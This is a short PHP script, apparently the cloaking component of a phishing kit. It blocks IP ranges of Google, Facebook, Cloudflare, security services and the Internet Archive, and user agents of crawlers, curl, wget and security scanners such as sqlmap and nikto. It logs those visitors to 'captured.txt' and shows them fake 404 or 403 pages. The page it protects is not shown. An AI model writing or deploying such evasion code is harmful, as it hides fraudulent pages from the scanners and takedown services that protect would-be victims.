<?php 
$a370a = $_SERVER['REMOTE_ADDR'];
$blocked_ips = array(
    "^185.60.*.*", 
    "^104.28.*.*", 
    "^172.217.*.*", 
    "^64.233.*.*", 
    "^216.58.*.*", 
    "^142.250.*.*",
    "^34.120.*.*", 
    "^66.102.*.*", 
    "^198.51.100.*", 
    "^203.0.113.*", 
    "^192.0.2.*", 
    "^185.199.*.*",
    "^146.112.*.*", 
    "^207.241.*.*",
    "^23.239.*.*",
    "^45.79.*.*"
);

// التحقق من حظر الـ IP
foreach ($blocked_ips as $pattern) {
    if (preg_match('/' . $pattern . '/', $a370a)) {
        file_put_contents("captured.txt", "Blocked IP: {$a370a} | " . date('d/m/Y h:i:sa') . "\n", FILE_APPEND);
        header('Location: https://www.example.com/');
        echo "<h1>404 Not Found</h1>The page that you have requested could not be found.";
        exit;
    }
}

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_bots = array(
    "bot", "spider", "crawl", "curl", "wget", "httpclient", 
    "scanner", "lssrocketcrawler", "pingdom", "nagios", 
    "acunetix", "netsparker", "masscan", "nikto", "fuzzer", 
    "apachebench", "sqlmap", "dirbuster"
);

// التحقق من البوتات
foreach ($blocked_bots as $bot) {
    if (strpos($user_agent, $bot) !== false || empty($user_agent)) {
        file_put_contents("captured.txt", "Blocked Bot/User-Agent: {$user_agent} | " . date('d/m/Y h:i:sa') . "\n", FILE_APPEND);
        header('Location: https://www.example.com/');
        echo "<h1>403 Forbidden</h1>Access is restricted.";
        exit;
    }
}
?>
